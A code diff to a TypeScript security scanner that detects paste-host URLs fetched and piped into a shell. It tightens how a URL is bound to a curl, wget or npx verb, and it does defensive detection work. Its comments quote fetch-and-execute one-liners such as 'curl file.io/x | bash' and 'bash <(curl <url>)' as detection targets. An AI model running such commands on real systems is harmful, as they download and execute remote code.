@@ -42,10 +42,22 @@
  * escalation on top.
  *
  * `TRANSIENT_TRANSFER_HOSTS` never reaches critical: it emits
- * `paste_host_fetch` at medium whenever it is an actual fetch target
- * (same-line fetch verb), regardless of execution evidence — `curl
- * file.io/x | bash` alone staying sub-threshold is intentional, not a gap
- * (see patterns.ts's `TRANSIENT_TRANSFER_HOSTS` comment for the rationale).
+ * `paste_host_fetch` at medium whenever it is an actual fetch target (the URL
+ * is the ARGUMENT of a same-line fetch verb — see `isActualFetchTarget`
+ * below), regardless of execution evidence — `curl file.io/x | bash` alone
+ * staying sub-threshold is intentional, not a gap (see patterns.ts's
+ * `TRANSIENT_TRANSFER_HOSTS` comment for the rationale).
+ *
+ * SMI-6033 Wave 3 (adversarial-review fix): the "is this URL fetched?" gate
+ * used to be a bare `FETCH_COMMAND_PATTERN` test against the whole LINE, so a
+ * fetch verb ANYWHERE on the line counted — `curl --version; see mirror docs
+ * at https://pastebin.com/abc` wrongly registered the pastebin URL as
+ * fetched. Replaced with `isActualFetchTarget`, which binds the URL to the
+ * verb by tokenizing the prefix that precedes it. Same bug class as Wave 4's
+ * `decoy_misdirection` fix; see `isActualFetchTarget`'s own doc comment for
+ * the two deliberate adaptations to this detector's inputs. This affects ONLY
+ * the same-line fetch-target gate — the direct-pipe and npx-direct-exec
+ * execution-evidence paths below are a different code path and are unchanged.
  *
  * Known, documented residual (static scanner, no network I/O): redirect-
  * chain/final-host resolution is out of scope by design — custom domains,
@@ -59,7 +71,7 @@ import { extractUrls } from './SecurityScanner.urls.js'
 import { ANON_PASTE_HOSTS, TRANSIENT_TRANSFER_HOSTS, URL_SHORTENER_DOMAINS } from './patterns.js'
 import { safeRegexCheck, safeRegexTest } from './regex-utils.js'
 import {
-  FETCH_COMMAND_PATTERN,
+  correlationTargetBasename,
   isCorrelatedWithFetchDestination,
 } from './SecurityScanner.fetch-correlation.js'
 
@@ -112,18 +124,130 @@ function isDirectPipeToInterpreter(url: string, lineContent: string): boolean {
 }
 
 // npx directly executes whatever it fetches from a URL — no pipe, no
-// intermediate file — so this is its own direct-execution shape (the same
-// "npx immediately followed by a URL" clause FETCH_COMMAND_PATTERN already
-// uses to decide "is this line a fetch target" doubles as execution
-// evidence here, since npx never just downloads).
+// intermediate file — so this is its own direct-execution shape (npx never
+// just downloads, so a line that fetches a URL through npx has, by that
+// fact alone, executed it).
 const NPX_DIRECT_EXEC_PATTERN = /\bnpx\b[^\n]{0,80}https?:\/\//i
 
-// Execution/chmod/source instructions whose target basename is correlated
+// ============================================================================
+// Same-line fetch-TARGET binding (SMI-6033 Wave 3 adversarial-review fix)
+// ============================================================================
+
+/**
+ * This detector used to decide "is this paste-host URL fetched?" with a bare
+ * `FETCH_COMMAND_PATTERN` test against the whole LINE — i.e. "does a fetch
+ * verb appear anywhere on this line", not "is THIS URL the argument to that
+ * verb". `curl --version; see mirror docs at https://pastebin.com/abc`
+ * therefore registered the pastebin URL as fetched purely because the token
+ * `curl` appeared earlier in an unrelated command.
+ *
+ * Same bug class as the one already fixed in Wave 4's `decoy_misdirection`
+ * detector (`SecurityScanner.decoy.ts`'s `isActualFetchTarget`), and the fix
+ * is the same idea — tokenize the line prefix that precedes the URL and
+ * require the URL to actually be a fetch verb's argument — with two
+ * deliberate adaptations for this detector's inputs:
+ *
+ *   1. A command separator (`;`, `|`, `&`) does not disqualify the whole
+ *      line, it just bounds the search: only the segment the URL itself sits
+ *      in can bind it. `cd /tmp && curl <url> | bash` is a real attack shape
+ *      that decoy.ts's stricter "reject on any separator" rule would drop,
+ *      and this detector's whole point is catching piped/chained execution.
+ *   2. The verb need not be the FIRST token of that segment. Paste-host
+ *      fetches routinely arrive wrapped in markdown/shell decoration
+ *      (`- Run \`curl <url> | bash\``, `$ curl <url>`, `bash <(curl <url>)`),
+ *      so the check anchors on the LAST fetch verb in the segment and then
+ *      requires every token between that verb and the URL to be a flag (or
+ *      the value argument of a value-taking flag). Prose between the verb
+ *      and the URL — "see mirror docs at" — still fails, which is exactly
+ *      the FP being closed.
+ */
+const FETCH_VERB_TOKENS = new Set(['curl', 'wget', 'npx'])
+/** A bare flag token, e.g. `-o`, `-fsSL`, `--output`, `--data=x`. */
+const FLAG_TOKEN = /^-{1,2}[A-Za-z][\w-]*$/
+/**
+ * Common curl/wget/npx flags that take a SEPARATE value token (e.g.
+ * `-o setup.sh`, `-X POST`) — that value token must be consumed as part of
+ * the flag, not mistaken for prose.
+ */
+const VALUE_TAKING_FLAGS = new Set([
+  '-o',
+  '-x',
+  '-h',
+  '-d',
+  '-a',
+  '-e',
+  '-u',
+  '-b',
+  '--output',
+  '--request',
+  '--header',
+  '--data',
+  '--data-raw',
+  '--data-binary',
+  '--data-urlencode',
+  '--user-agent',
+  '--referer',
+  '--proxy',
+  '--cookie',
+])
+
+/**
+ * Strip markdown/shell decoration off a token (leading backticks, quotes,
+ * `$`/`>` prompt markers, `<(`; trailing quotes, backticks, brackets) while
+ * preserving the leading `-`/`--` that makes a flag a flag. Lowercased, so
+ * the verb and flag lookups above stay case-insensitive.
+ */
+function bareToken(token: string): string {
+  return token
+    .replace(/^[^A-Za-z0-9/.-]+/, '')
+    .replace(/[^A-Za-z0-9/._-]+$/, '')
+    .toLowerCase()
+}
+
+/** Is the URL that follows `prefix` on this line the argument of a fetch verb? */
+function isFetchVerbArgument(prefix: string): boolean {
+  // Only the segment after the LAST command separator can bind the URL —
+  // anything before it belongs to a different command.
+  const segment = prefix.split(/[;|&]/).pop() ?? ''
+  const tokens = segment
+    .trim()
+    .split(/\s+/)
+    .map(bareToken)
+    .filter((t) => t.length > 0)
+  let afterVerb = -1
+  for (let i = 0; i < tokens.length; i++) {
+    if (tokens[i] === 'git' && tokens[i + 1] === 'clone') afterVerb = i + 2
+    else if (FETCH_VERB_TOKENS.has(tokens[i])) afterVerb = i + 1
+  }
+  if (afterVerb < 0) return false
+  for (let i = afterVerb; i < tokens.length; i++) {
+    const token = tokens[i]
+    if (!FLAG_TOKEN.test(token)) return false
+    if (VALUE_TAKING_FLAGS.has(token) && i + 1 < tokens.length) i++ // consume the flag's value
+  }
+  return true
+}
+
+/**
+ * True when `url` is actually the argument to a fetch verb somewhere on
+ * `lineContent` — checked at EVERY occurrence of the URL on the line, so a
+ * prose mention followed by a real fetch of the same URL still binds.
+ */
+function isActualFetchTarget(lineContent: string, url: string): boolean {
+  for (let from = 0; ; ) {
+    const urlIndex = lineContent.indexOf(url, from)
+    if (urlIndex < 0) return false
+    if (isFetchVerbArgument(lineContent.slice(0, urlIndex))) return true
+    from = urlIndex + 1
+  }
+}
+
+// Execution/chmod/source instructions whose target path is correlated
 // against a paste-host/shortener fetch's download destination via the
 // shared `isCorrelatedWithFetchDestination`. Deliberately local to this file
 // (not imported from SecurityScanner.compound.ts, which Gap 5's concurrent
-// xattr fix is editing) — same normalization (strip quotes, take the final
-// path segment, ≥3-char gate) as compound.ts's own chmod correlation.
+// xattr fix is editing) — same normalization (strip quotes, ≥3-char gate on
+// the final path segment) as compound.ts's own chmod correlation.
 const CHMOD_TARGET =
   /\bchmod\s+(?:-[A-Za-z]+\s+)?(?:[0-7]{3,4}|[ugoa]*(?:[+\-=][rwxXstugo]+(?:,[ugoa]*[+\-=][rwxXstugo]*)*)+)\s+(\S+)/i
 const DIRECT_EXEC_TARGET =
@@ -140,26 +264,31 @@ const EXEC_TARGET_PATTERNS = [
   SOURCE_TARGET,
 ]
 
-/** Every exec/chmod/source target basename (≥3 chars, normalized) across the document. */
-function collectExecTargetBasenames(lines: readonly string[]): string[] {
-  const basenames: string[] = []
+/**
+ * Every exec/chmod/source target PATH (final segment ≥3 chars, quotes
+ * stripped) across the document. SMI-6033 Wave 3: full paths, not basenames —
+ * the shared correlation utility is directory-aware and must not be handed a
+ * path-stripped target.
+ */
+function collectExecTargetPaths(lines: readonly string[]): string[] {
+  const paths: string[] = []
   for (const line of lines) {
     for (const pattern of EXEC_TARGET_PATTERNS) {
       const m = safeRegexTest(pattern, line)
       if (!m?.[1]) continue
-      const base = m[1].replace(/['"]/g, '').split('/').pop() ?? ''
-      if (base.length >= 3) basenames.push(base)
+      const targetPath = m[1].replace(/['"]/g, '')
+      if (correlationTargetBasename(targetPath).length >= 3) paths.push(targetPath)
     }
   }
-  return basenames
+  return paths
 }
 
 /** Was `fetchLine`'s download destination later executed/chmod'd/sourced elsewhere? */
 function isExecutedElsewhereCorrelated(
   fetchLine: string,
-  execTargetBasenames: readonly string[]
+  execTargetPaths: readonly string[]
 ): boolean {
-  return execTargetBasenames.some((base) => isCorrelatedWithFetchDestination(base, [fetchLine]))
+  return execTargetPaths.some((path) => isCorrelatedWithFetchDestination(path, [fetchLine]))
 }
 
 export function scanPasteHostFetch(
@@ -170,7 +299,7 @@ export function scanPasteHostFetch(
   const lines = content.split('\n')
   const contexts = lineContexts ?? analyzeMarkdownContext(content)
   const urls = extractUrls(content)
-  const execTargetBasenames = collectExecTargetBasenames(lines)
+  const execTargetPaths = collectExecTargetPaths(lines)
 
   for (const { url, line } of urls) {
     const tier = classifyPasteHostTier(url)
@@ -178,14 +307,14 @@ export function scanPasteHostFetch(
 
     const lineIndex = line - 1
     const lineContent = lines[lineIndex] ?? ''
-    // The URL is a fetch TARGET only when a fetch verb appears on the SAME
-    // line — deliberately not widened to a bounded window (unlike the
-    // chmod/archive compound signals) since a URL literally is the thing
-    // being fetched when a fetch verb shares its line; widening would risk
-    // correlating an unrelated fetch command to an unrelated nearby
-    // paste-host mention.
-    const isFetchTarget = safeRegexTest(FETCH_COMMAND_PATTERN, lineContent) !== null
-    if (!isFetchTarget) continue // merely linked -> scanUrls()'s url:medium finding already covers this
+    // The URL is a fetch TARGET only when it is ACTUALLY the argument of a
+    // fetch verb on the SAME line (SMI-6033 Wave 3 — see isActualFetchTarget
+    // above for the FP this replaced). Deliberately not widened to a bounded
+    // window (unlike the chmod/archive compound signals) since a URL
+    // literally is the thing being fetched when it is that verb's argument;
+    // widening would risk correlating an unrelated fetch command to an
+    // unrelated nearby paste-host mention.
+    if (!isActualFetchTarget(lineContent, url)) continue // merely linked -> scanUrls()'s url:medium finding already covers this
 
     const ctx = contexts[lineIndex]
     const inDocContext = ctx ? isDocumentationContext(ctx) : false
@@ -212,7 +341,7 @@ export function scanPasteHostFetch(
     const executed =
       isDirectPipeToInterpreter(url, lineContent) ||
       safeRegexCheck(NPX_DIRECT_EXEC_PATTERN, lineContent) ||
-      isExecutedElsewhereCorrelated(lineContent, execTargetBasenames)
+      isExecutedElsewhereCorrelated(lineContent, execTargetPaths)
     if (!executed) continue // fetched but not executed -> scanUrls()'s url:medium finding already covers this
 
     findings.push({
